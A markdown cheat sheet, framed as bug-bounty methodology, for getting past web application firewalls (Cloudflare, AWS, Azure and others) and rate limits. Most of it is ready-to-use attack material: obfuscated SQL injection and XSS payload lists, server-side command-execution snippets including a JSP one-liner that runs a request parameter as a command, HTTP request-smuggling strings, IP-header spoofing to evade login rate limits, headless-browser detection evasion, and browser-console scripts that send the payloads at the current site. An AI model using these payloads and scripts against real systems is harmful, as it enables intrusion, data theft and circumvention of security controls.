# BYPASS CHEATSHEET

# WAF Bypass Techniques & Payloads

Comprehensive WAF bypass methodology for bug bounty. Covers cloud-based (AWS WAF, Azure WAF, Cloudflare) and on-premise WAFs.

## WAF Detection First

Before bypassing, identify the WAF:

```bash
# Cloudflare
curl -sI https://target.com | grep -i "cf-ray\|server: cloudflare"

# AWS WAF
curl -sI https://target.com | grep -i "x-amzn-requestid\|x-amz-cf-id"

# Azure WAF
curl -sI https://target.com | grep -i "x-azure-ref\|x-ms-request-id"

# Akamai
curl -sI https://target.com | grep -i "x-akamai\|akamai"

# Cloudflare JS Challenge
curl -s https://target.com | grep -i "checking your browser\|challenge-platform"

# Alibaba Cloud WAF
curl -sI https://target.com | grep -i "acw_tc\|eagleid\|ali-swift"

# ModSecurity
curl -sI https://target.com | grep -i "mod_security\|modsecurity"

# Sucuri
curl -sI https://target.com | grep -i "x-sucuri\|sucuri"

# Imperva/Incapsula
curl -sI https://target.com | grep -i "x-iinfo\|incap_ses"
```

## Technique 1: Obfuscation

### SQL Injection Obfuscation

```javascript
const SQLI_OBFUSCATION = {
    // Comment insertion
    comments: [
        "SEL/**/ECT * FR/**/OM users",
        "UNI/**/ON SEL/**/ECT 1,2,3",
        "OR/**/ 1=1",
        "AND/**/ 1=1",
        "' OR/**/ '1'='1",
        "' UNI/**/ON SEL/**/ECT/**/1,2,3--",
        "admin'/**/OR/**/'1'='1",
        "1'/**/OR/**/1=1/**/--",
        // MySQL specific
        "/*!50000UNION*//*!50000SELECT*/1,2,3",
        "/*!UNION*//*!SELECT*/1,2,3",
        "/*!50000UNION*//*!50000SELECT*//*!50000*/*/*!50000FROM*/users",
        "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3",
        "UNI/**/ON+SE/**/LECT+1,2,3",
        "/*!50000%55NION*/ /*!50000%53ELECT*/ 1,2,3",
    ],
    
    // Case variation
    case_variation: [
        "SeLeCt * FrOm users",
        "uNiOn SeLeCt 1,2,3",
        "oR 1=1",
        "aNd 1=1",
        "UniOn SelEct 1,2,3--",
        "sElEcT * fRoM users WhErE 1=1",
        "InSeRt InTo users",
        "UpDaTe users SeT",
        "DeLeTe FrOm users",
        "DrOp TaBlE users",
    ],
    
    // Keyword splitting
    keyword_split: [
        "SEL'+'ECT * FROM users",
        "UNI'+'ON SEL'+'ECT 1,2,3",
        "' OR '1'+'='1",
        "' AND '1'+'='1",
        "CONCAT('SEL','ECT')",
        "CHAR(83,69,76,69,67,84)",  // SELECT
        "0x53454C454354",  // SELECT in hex
        "CHAR(85,78,73,79,78)",  // UNION
        "0x554E494F4E",  // UNION in hex
    ],
    
    // Whitespace alternatives
    whitespace: [
        "SELECT/**/*/**/FROM/**/users",
        "SELECT%09*%09FROM%09users",  // Tab
        "SELECT%0A*%0AFROM%0Ausers",  // Newline
        "SELECT%0D*%0DFROM%0Dusers",  // Carriage return
        "SELECT%0B*%0BFROM%0Busers",  // Vertical tab
        "SELECT%0C*%0CFROM%0Cusers",  // Form feed
        "SELECT%A0*%A0FROM%A0users",  // Non-breaking space
        "SELECT%09%0A%0D%0B%0C*%09%0A%0D%0B%0CFROM%09%0A%0D%0B%0Cusers",
        "SELECT%20*%20FROM%20users",  // Normal space (URL encoded)
        "SELECT+*+FROM+users",  // Plus sign
    ],
    
    // Parenthesis tricks
    parentheses: [
        "SELECT(*)FROM(users)",
        "UNION(SELECT(1),(2),(3))",
        "OR(1)=(1)",
        "AND(1)=(1)",
        "(SELECT(*)FROM(users))",
        "((SELECT(*)FROM(users)))",
        "UNION((SELECT(1),(2),(3)))",
        "OR((1)=(1))",
        "AND((1)=(1))",
    ],
    
    // Double encoding
    double_encoding: [
        "%2527%2520OR%25201%253D1",
        "%2527%2520UNION%2520SELECT%25201%252C2%252C3--",
        "%2527%2520OR%2520%25271%2527%253D%25271",
        "%27%20OR%201%3D1--",  // Single URL encode
        "%2527%2520OR%25201%253D1--",  // Double URL encode
    ],
    
    // Mixed encoding
    mixed_encoding: [
        "%27%20OR%201=1--",  // Partial encode
        "'%20OR%201%3D1--",  // Partial encode
        "%27%20OR%201%3D1--",  // Full encode
        "0x27204f5220313d312d2d",  // Full hex
        "\\x27\\x20OR\\x201=1--",  // Hex escape
    ],
};
```

### XSS Obfuscation

```javascript
const XSS_OBFUSCATION = {
    // Case variation
    case_variation: [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<IMG SRC=x OnErRoR=alert(1)>",
        "<sVg OnLoAd=alert(1)>",
        "<iMg SrC=x OnErRoR=alert(1)>",
        "<bOdY oNlOaD=alert(1)>",
        "<iNpUt OnFoCuS=alert(1) aUtOfOcUs>",
    ],
    
    // Tag breaking
    tag_breaking: [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=alert(1)//",
        "<img src=x onerror=alert(1)\"",
        "<svg onload=alert(1)//",
        "<svg onload=alert(1)\"",
        "<img/src=x/onerror=alert(1)>",
        "<img src=x onerror =alert(1)>",
        "<img src=x onerror= alert(1)>",
        "<img src=x onerror=alert (1)>",
        "<img src=x onerror=alert( 1)>",
        "<img src=x onerror=alert(1 )>",
    ],
    
    // Encoding
    encoding: [
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "\\x3cimg src=x onerror=alert(1)\\x3e",
        "\\u003cimg src=x onerror=alert(1)\\u003e",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
    ],
    
    // Null bytes
    null_bytes: [
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        "<img src=x\x00onerror=alert(1)>",
        "<svg\x00onload=alert(1)>",
        "\x00<script>alert(1)</script>",
        "<\x00script>alert(1)</\x00script>",
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
    ],
    
    // Unicode
    unicode: [
        "<script>\\u0061lert(1)</script>",
        "<img src=x onerror=\\u0061lert(1)>",
        "<script>\\u0065\\u0076\\u0061\\u006c('alert(1)')</script>",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    ],
    
    // HTML entities
    html_entities: [
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<script>&#97;&#108;&#101;&#114;&#116;(1)</script>",
        "&#x3C;img src=x onerror=alert(1)&#x3E;",
        "&#60;img src=x onerror=alert(1)&#62;",
    ],
    
    // JavaScript obfuscation
    js_obfuscation: [
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<img src=x onerror=Function('ale'+'rt(1)')()>",
        "<img src=x onerror=setTimeout('ale'+'rt(1)')>",
        "<img src/x onerror=location='javascript:alert(1)'>",
        "<svg onload=location='java\\x73cript:alert(1)'>",
        "<svg onload=location='java\\u0073cript:alert(1)'>",
    ],
    
    // Polyglot (multi-context)
    polyglot: [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik11telerik0telerik//telerik>telerik/telerik*/</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"</script><script>alert(1)</script>\"><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http://i.imgur.com/P8mL8.jpg\">",
    ],
};
```

## Technique 2: Advanced Encoding

### Multi-Layer Encoding

```javascript
const MULTI_LAYER_ENCODING = {
    // Double URL encoding
    double_url: [
        "%2527%2520OR%25201%253D1--",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "%2527%2520UNION%2520SELECT%25201%252C2%252C3--",
    ],
    
    // Triple URL encoding
    triple_url: [
        "%252527%252520OR%2525201%25253D1--",
        "%25253Cscript%25253Ealert(1)%25253C/script%25253E",
    ],
    
    // URL + HTML encoding
    url_html: [
        "%26%23x27%3B%20OR%201%3D1--",  // '&#x27;' = '
        "%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B/script%26%2362%3B",  // <script>
    ],
    
    // URL + Unicode
    url_unicode: [
        "%5Cu0027%20OR%201%3D1--",  // \\u0027 = '
        "%5Cu003Cscript%5Cu003Ealert(1)%5Cu003C/script%5Cu003E",
    ],
    
    // Base64 + URL
    base64_url: [
        "JyBPUiAxPTEtLQ==",  // ' OR 1=1--
        "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",  // <script>alert(1)</script>
    ],
    
    // Hex + URL
    hex_url: [
        "%27%204f52%20313d312d2d",  // ' OR 1=1--
        "3c7363726970743e616c6572742831293c2f7363726970743e",  // <script>alert(1)</script>
    ],
    
    // Mixed encoding layers
    mixed_layers: [
        "%26%23x27%3B%2520OR%25201%253D1--",  // HTML + Double URL
        "%5Cu0027%2520OR%25201%253D1--",  // Unicode + Double URL
        "JyBPUiAxPTEtLQ%3D%3D",  // Base64 + URL encoded
    ],
};
```

### Server-Side Encoding Bypass

```javascript
const SERVER_SIDE_ENCODING = {
    // PHP encoding
    php: [
        "<?=system('id')?>",
        "<?=echo shell_exec('id')?>",
        "<?=passthru('id')?>",
        "<?=`id`?>",
        "<?=eval(base64_decode('c3lzdGVtKCdpZCcpOw==')?>",
    ],
    
    // ASP encoding
    asp: [
        "<%Response.Write(CreateObject(\"WScript.Shell\").Exec(\"id\").StdOut.ReadAll())%>",
        "<%=Server.CreateObject(\"WScript.Shell\").Exec(\"id\").StdOut.ReadAll()%>",
    ],
    
    // JSP encoding
    jsp: [
        "<%=Runtime.getRuntime().exec(\"id\")%>",
        "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
    ],
    
    // Node.js template
    nodejs: [
        "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
};
```

## Technique 3: Payload Fragmentation

### Chunked Transfer Encoding

```javascript
const FRAGMENTATION = {
    // Split SQLi across multiple parameters
    sqli_fragmented: [
        // Parameter 1: ' OR
        // Parameter 2: 1=1
        // Parameter 3: --
        {param1: "' OR", param2: "1=1", param3: "--"},
        
        // Parameter 1: ' UNION
        // Parameter 2: SELECT
        // Parameter 3: 1,2,3
        {param1: "' UNION", param2: "SELECT", param3: "1,2,3--"},
    ],
    
    // Split XSS across attributes
    xss_fragmented: [
        // Attribute 1: onmouseover=
        // Attribute 2: alert(1)
        {attr1: "onmouseover=", attr2: "alert(1)"},
        
        // Attribute 1: javascript:
        // Attribute 2: alert(1)
        {attr1: "javascript:", attr2: "alert(1)"},
    ],
    
    // Chunked body (HTTP/1.1)
    chunked_body: [
        // Send payload in chunks
        "7\r\n' OR 1=\r\n",
        "3\r\n1--\r\n",
        "0\r\n\r\n",
    ],
    
    // Multi-part boundary
    multipart: [
        "------WebKitFormBoundary\r\n",
        "Content-Disposition: form-data; name=\"input\"\r\n\r\n",
        "' OR 1=1--\r\n",
        "------WebKitFormBoundary--\r\n",
    ],
};
```

### Parameter Pollution

```javascript
const HPP_PAYLOADS = {
    // Same parameter multiple times
    duplicate: [
        "input=value1&input=value2",
        "input=' OR 1=1--&input=safe",
        "input=safe&input=' OR 1=1--",
        "input=' OR&input=1=1--",
    ],
    
    // Array notation
    array: [
        "input[]=' OR 1=1--",
        "input[0]=safe&input[1]=' OR 1=1--",
        "input{0}=' OR 1=1--",
    ],
    
    // JSON injection
    json: [
        '{"input": "safe", "input": "\' OR 1=1--"}',
        '{"input": "\' OR 1=1--"}',
        '{"input": "safe"} \' OR 1=1--',
    ],
};
```

## Technique 4: Header Manipulation

### IP Rotation & Spoofing

```javascript
const HEADER_SPOOFING = {
    // X-Forwarded-For variations
    x_forwarded: [
        "X-Forwarded-For: 127.0.0.1",
        "X-Forwarded-For: 10.0.0.1",
        "X-Forwarded-For: 172.16.0.1",
        "X-Forwarded-For: 192.168.1.1",
        "X-Forwarded-For: ::1",
        "X-Forwarded-For: localhost",
        "X-Forwarded-For: 127.0.0.1, 10.0.0.1",
        "X-Forwarded-For: 10.0.0.1, 127.0.0.1",
    ],
    
    // Other IP headers
    other_ip_headers: [
        "X-Real-IP: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "X-Remote-IP: 127.0.0.1",
        "X-Remote-Addr: 127.0.0.1",
        "X-Client-IP: 127.0.0.1",
        "X-Forwarded-Host: 127.0.0.1",
        "X-Host: 127.0.0.1",
        "True-Client-IP: 127.0.0.1",
        "CF-Connecting-IP: 127.0.0.1",
        "X-Connecting-IP: 127.0.0.1",
    ],
    
    // User-Agent rotation
    user_agents: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    ],
    
    // Referer spoofing
    referer: [
        "Referer: https://www.google.com/",
        "Referer: https://www.bing.com/",
        "Referer: https://target.com/",
        "Referer: https://target.com/login",
        "Referer: https://target.com/dashboard",
    ],
    
    // Host header manipulation
    host: [
        "Host: localhost",
        "Host: 127.0.0.1",
        "Host: target.com:80",
        "Host: target.com:443",
        "Host: internal.target.com",
        "Host: admin.target.com",
    ],
};
```

## Technique 5: Browser & TLS Fingerprint Bypass

### Natural User Behavior

```javascript
const NATURAL_BEHAVIOR = {
    // Random delays between requests
    delays: {
        min: 1000,  // 1 second
        max: 5000,  // 5 seconds
        random: true,
    },
    
    // Mouse movements (simulated)
    mouse_movements: [
        {x: 100, y: 200},
        {x: 300, y: 400},
        {x: 500, y: 100},
    ],
    
    // Scroll behavior
    scroll: {
        direction: "down",
        amount: "random",
        speed: "variable",
    },
    
    // Click patterns
    clicks: {
        element: "random_visible",
        delay_after: 500,
    },
};
```

### Headless Browser Detection Bypass

```javascript
const HEADLESS_BYPASS = {
    // Override navigator properties
    navigator_overrides: {
        webdriver: false,
        languages: ["en-US", "en"],
        plugins: [1, 2, 3, 4, 5],
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    },
    
    // Override Chrome properties
    chrome_overrides: {
        runtime: {},
        loadTimes: function() {},
        csi: function() {},
        app: {},
    },
    
    // Override permissions
    permissions_overrides: {
        query: "granted",
    },
    
    // Override WebGL
    webgl_overrides: {
        vendor: "Google Inc. (NVIDIA)",
        renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1080 Ti Direct3D11 vs_5_0 ps_5_0, D3D11)",
    },
};
```

## Technique 6: Cloud WAF Specific Bypass

### Cloudflare Bypass

```javascript
const CLOUDFLARE_BYPASS = {
    // IP origin discovery
    origin_ip: [
        // Check DNS history
        "nslookup target.com",
        "dig target.com",
        
        // Check subdomains
        "mail.target.com",
        "ftp.target.com",
        "cpanel.target.com",
        "webmail.target.com",
        "direct.target.com",
        "origin.target.com",
    ],
    
    // Path traversal to bypass
    path_bypass: [
        "/%2e/target.com",
        "/target.com%2f%2e%2e",
        "/target.com/..;/",
        "/target.com;/",
        "/target.com%09",
        "/target.com%0d%0a",
        "/target.com%00",
    ],
    
    // Protocol bypass
    protocol: [
        "http://target.com",  // If HTTPS-only
        "https://target.com:80",
        "https://target.com:8080",
        "https://target.com:8443",
    ],
};
```

### AWS WAF Bypass

```javascript
const AWS_WAF_BYPASS = {
    // Body size limits
    body_size: [
        // Send payload in large body
        "A".repeat(8192) + "' OR 1=1--",
        // Chunked transfer
        "Transfer-Encoding: chunked",
    ],
    
    // Content-Type tricks
    content_type: [
        "Content-Type: application/x-www-form-urlencoded",
        "Content-Type: multipart/form-data",
        "Content-Type: application/json",
        "Content-Type: text/xml",
        "Content-Type: application/soap+xml",
    ],
    
    // Request smuggling
    smuggling: [
        "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
    ],
};
```

### Azure WAF Bypass

```javascript
const AZURE_WAF_BYPASS = {
    // Path traversal
    path: [
        "/%2e/target",
        "/target%2f%2e%2e",
        "/target/..;/",
        "/target;%2f..%2f..",
    ],
    
    // Case variation
    case: [
        "/TARGET",
        "/Target",
        "/tArGeT",
    ],
    
    // Unicode
    unicode: [
        "/%ef%bc%8ftarget",
        "/%e2%80%aftarget",
        "/%c0%aftarget",
    ],
};
```

## Technique 7: Advanced Bypass Combinations

### SQLi WAF Bypass (Complete)

```javascript
const ADVANCED_SQLI_BYPASS = {
    // MySQL comment bypass
    mysql_comments: [
        "/*!50000UNION*//*!50000SELECT*/1,2,3",
        "/*!UNION*//*!SELECT*/1,2,3",
        "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3",
        "UNI/**/ON+SE/**/LECT+1,2,3",
        "/*!50000%55NION*/ /*!50000%53ELECT*/ 1,2,3",
    ],
    
    // Case + comment + whitespace
    combined: [
        "uNiOn/**/sElEcT/**/1,2,3",
        "'/**/oR/**/'1'='1",
        "'/**/aNd/**/'1'='1",
        "uNiOn%09sElEcT%091,2,3",
        "'%09oR%09'1'='1",
    ],
    
    // Variable manipulation
    variables: [
        "@@version",
        "@@datadir",
        "@@basedir",
        "CONCAT(@@version)",
        "UNION SELECT CONCAT(@@version)",
    ],
    
    // Function alternatives
    functions: [
        "CHAR(83,69,76,69,67,84)",  // SELECT
        "0x53454C454354",  // SELECT hex
        "ELT(1,'SELECT')",
        "MAKE_SET(1,'SELECT')",
        "EXPORT_SET(1,'SELECT','','',1)",
    ],
    
    // Time-based blind
    time_based: [
        "' AND SLEEP(3)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "' AND BENCHMARK(10000000,SHA1('test'))--",
        "'; WAITFOR DELAY '0:0:3'--",
        "' OR pg_sleep(3)--",
        "' AND 1=(SELECT 1 FROM (SELECT SLEEP(3))x)--",
    ],
    
    // Error-based
    error_based: [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
    ],
};
```

### XSS WAF Bypass (Complete)

```javascript
const ADVANCED_XSS_BYPASS = {
    // Without parentheses
    no_parens: [
        "<svg onload=alert`1`>",
        "<img src=x onerror=alert`1`>",
        "<svg onload=alert&lpar;1&rpar;>",
        "<svg onload=alert&#40;1&#41;>",
        "<svg onload=alert&#x28;1&#x29;>",
    ],
    
    // Without quotes
    no_quotes: [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
    ],
    
    // Without angle brackets
    no_angles: [
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "'-alert(1)//",
        "\"-alert(1)//",
    ],
    
    // Template injection style
    template: [
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "#{alert(1)}",
        "{{7*7}}",
        "${7*7}",
    ],
    
    // Event handler alternatives
    events: [
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)//",
        "<svg onload=alert(1)\"",
        "<img src=x onerror=alert(1)//",
        "<img src=x onerror=alert(1)\"",
        "<body onload=alert(1)//",
        "<input onfocus=alert(1) autofocus//",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video onerror=alert(1)><source>",
        "<audio onerror=alert(1)><source>",
        "<object data=javascript:alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
    ],
    
    // Data URI
    data_uri: [
        "<a href=data:text/html,<script>alert(1)</script>>click</a>",
        "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>",
        "<object data=data:text/html,<script>alert(1)</script>>",
        "<iframe src=data:text/html,<script>alert(1)</script>>",
    ],
};
```

## Browser Console WAF Bypass Tester

```javascript
// Automated WAF bypass testing
(async () => {
    const url = new URL(window.location.href);
    const params = url.searchParams;
    
    const bypassTechniques = {
        // SQLi bypass
        sqli: [
            {name: "Comment", payload: "' OR/**/ 1=1--"},
            {name: "Case", payload: "' oR 1=1--"},
            {name: "Whitespace", payload: "'%09OR%091=1--"},
            {name: "Double encode", payload: "%2527%2520OR%25201%253D1--"},
            {name: "MySQL comment", payload: "/*!50000UNION*//*!50000SELECT*/1,2,3"},
        ],
        
        // XSS bypass
        xss: [
            {name: "Case", payload: "<ScRiPt>alert(1)</ScRiPt>"},
            {name: "Null byte", payload: "<scr\x00ipt>alert(1)</scr\x00ipt>"},
            {name: "Unicode", payload: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"},
            {name: "HTML entity", payload: "&#60;script&#62;alert(1)&#60;/script&#62;"},
            {name: "No parens", payload: "<svg onload=alert`1`>"},
        ],
    };
    
    console.log('=== WAF Bypass Testing ===');
    
    for (const [key, value] of params.entries()) {
        console.log(`\nTesting parameter: ${key}=${value}`);
        
        for (const [type, techniques] of Object.entries(bypassTechniques)) {
            for (const technique of techniques) {
                const testUrl = new URL(url);
                testUrl.searchParams.set(key, value + technique.payload);
                
                try {
                    const r = await fetch(testUrl.href, {redirect: 'manual'});
                    const body = await r.text();
                    
                    // Check if blocked
                    const isBlocked = r.status === 403 || 
                                     r.status === 406 || 
                                     body.includes('blocked') ||
                                     body.includes('forbidden') ||
                                     body.includes('access denied');
                    
                    if (!isBlocked) {
                        console.log(`  BYPASS: ${type} - ${technique.name}`);
                        console.log(`    Payload: ${technique.payload}`);
                        console.log(`    Status: ${r.status}`);
                    }
                } catch(e) {}
            }
        }
    }
})();
```

## WAF Fingerprinting Script

```javascript
// Identify WAF type
(async () => {
    const wafSignatures = {
        cloudflare: ['cf-ray', 'server: cloudflare', '__cfduid'],
        aws: ['x-amzn-requestid', 'x-amz-cf-id', 'x-amzn-trace-id'],
        azure: ['x-azure-ref', 'x-ms-request-id'],
        akamai: ['x-akamai', 'akamai'],
        incapsula: ['x-iinfo', 'incap_ses', 'visid_incap'],
        sucuri: ['x-sucuri', 'sucuri'],
        modsecurity: ['mod_security', 'modsecurity'],
        barracuda: ['barra'],
        bigip: ['bigip', 'f5'],
        citrix: ['ns_af', 'citrix'],
        cloudfront: ['x-amz-cf-id', 'cloudfront'],
        fastly: ['x-served-by', 'fastly'],
        varnish: ['x-varnish', 'via: varnish'],
    };
    
    try {
        const r = await fetch(window.location.href, {redirect: 'manual'});
        const headers = {};
        r.headers.forEach((value, key) => {
            headers[key.toLowerCase()] = value;
        });
        
        console.log('=== WAF Detection ===');
        console.log('Status:', r.status);
        console.log('Headers:', headers);
        
        for (const [waf, signatures] of Object.entries(wafSignatures)) {
            for (const sig of signatures) {
                const [key, value] = sig.split(': ');
                if (headers[key] && (!value || headers[key].toLowerCase().includes(value))) {
                    console.log(`DETECTED: ${waf.toUpperCase()}`);
                    console.log(`  Signature: ${sig}`);
                }
            }
        }
    } catch(e) {
        console.log('Error:', e.message);
    }
})();
```

# Rate Limiting Bypass Techniques

Comprehensive guide to bypassing rate limiting on web applications during bug bounty testing.

## Overview

Rate limiting is implemented to prevent brute force attacks, enumeration, and denial of service. However, many implementations can be bypassed by spoofing IP headers or using other techniques.

## IP Spoofing Headers

### Primary Headers (Most Effective)

| Header | Works On | Example |
|--------|----------|---------|
| `CF-Connecting-IP` | Cloudflare, HCDN | `CF-Connecting-IP: 127.0.0.1` |
| `X-Forwarded-For` | Most CDNs, nginx | `X-Forwarded-For: 127.0.0.1` |
| `X-Real-IP` | nginx, Apache | `X-Real-IP: 127.0.0.1` |
| `X-Client-IP` | Some load balancers | `X-Client-IP: 127.0.0.1` |
| `True-Client-IP` | Akamai, Cloudflare | `True-Client-IP: 127.0.0.1` |
| `X-Forwarded-Host` | Some proxies | `X-Forwarded-Host: 127.0.0.1` |
| `X-Originating-IP` | Some email servers | `X-Originating-IP: 127.0.0.1` |
| `X-Remote-IP` | Some proxies | `X-Remote-IP: 127.0.0.1` |
| `X-Remote-Addr` | Some proxies | `X-Remote-Addr: 127.0.0.1` |
| `X-ProxyUser-IP` | Some proxies | `X-ProxyUser-IP: 127.0.0.1` |

### Secondary Headers (Less Common)

| Header | Works On | Example |
|--------|----------|---------|
| `X-Forwarded-For-Original` | Some WAFs | `X-Forwarded-For-Original: 127.0.0.1` |
| `X-Forwarded-By` | Some proxies | `X-Forwarded-By: 127.0.0.1` |
| `X-Forwarded-For-Port` | Some proxies | `X-Forwarded-For-Port: 443` |
| `X-Forwarded-For-Proto` | Some proxies | `X-Forwarded-For-Proto: https` |
| `X-Forwarded-Scheme` | Some proxies | `X-Forwarded-Scheme: https` |
| `X-Forwarded-Proto` | Some proxies | `X-Forwarded-Proto: https` |
| `X-Forwarded-Port` | Some proxies | `X-Forwarded-Port: 443` |
| `X-Forwarded-Host` | Some proxies | `X-Forwarded-Host: 127.0.0.1` |
| `X-Forwarded-Server` | Some proxies | `X-Forwarded-Server: 127.0.0.1` |
| `X-Forwarded-For-Original` | Some WAFs | `X-Forwarded-For-Original: 127.0.0.1` |

## IP Address Formats

### Valid IP Formats to Try

```
127.0.0.1           # Localhost
192.168.1.1         # Private IP
10.0.0.1            # Private IP
172.16.0.1          # Private IP
::1                 # IPv6 localhost
0:0:0:0:0:0:0:1     # IPv6 localhost full
fe80::1             # IPv6 link-local
fc00::1             # IPv6 unique local
2001:db8::1         # IPv6 documentation
```

### IP Ranges to Try

```
127.0.0.0/8         # Localhost range
192.168.0.0/16      # Private range
10.0.0.0/8          # Private range
172.16.0.0/12       # Private range
```

## Bypass Techniques

### 1. Single Header Bypass

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```

### 2. Multiple Headers Bypass

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

### 3. Header Injection Bypass

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1, 192.168.1.1
```

### 4. Case Variation Bypass

```http
GET /login HTTP/1.1
Host: target.com
x-forwarded-for: 127.0.0.1
X-FORWARDED-FOR: 127.0.0.1
```

### 5. Whitespace Bypass

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-For:  127.0.0.1
X-Forwarded-For: 127.0.0.1 
```

### 6. Tab Bypass

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-For:	127.0.0.1
```

### 7. Null Byte Bypass

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1%00
```

### 8. Double Header Bypass

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 192.168.1.1
```

### 9. Header Order Bypass

```http
GET /login HTTP/1.1
Host: target.com
X-Real-IP: 127.0.0.1
X-Forwarded-For: 192.168.1.1
```

### 10. Port Bypass

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1:8080
```

## Browser-Based Bypass

### Using fetch()

```javascript
(async () => {
    const bypassHeaders = [
        {'CF-Connecting-IP': '127.0.0.1'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'True-Client-IP': '127.0.0.1'}
    ];
    
    for (const headers of bypassHeaders) {
        const r = await fetch('/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                ...headers
            },
            body: 'username=admin&password=test'
        });
        
        console.log(Object.keys(headers)[0], r.status);
    }
})();
```

### Using XMLHttpRequest

```javascript
(async () => {
    const bypassHeaders = [
        {'CF-Connecting-IP': '127.0.0.1'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'}
    ];
    
    for (const headers of bypassHeaders) {
        const response = await new Promise((resolve) => {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/login', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            
            for (const [key, value] of Object.entries(headers)) {
                xhr.setRequestHeader(key, value);
            }
            
            xhr.onload = () => resolve({status: xhr.status, body: xhr.responseText});
            xhr.onerror = () => resolve({error: 'XHR error'});
            xhr.send('username=admin&password=test');
        });
        
        console.log(Object.keys(headers)[0], response.status);
    }
})();
```

## CDN-Specific Bypass

### Cloudflare

```http
CF-Connecting-IP: 127.0.0.1
CF-IPCountry: US
CF-Ray: 1234567890
CF-Visitor: {"scheme":"https"}
```

### HCDN (Hostinger)

```http
CF-Connecting-IP: 127.0.0.1
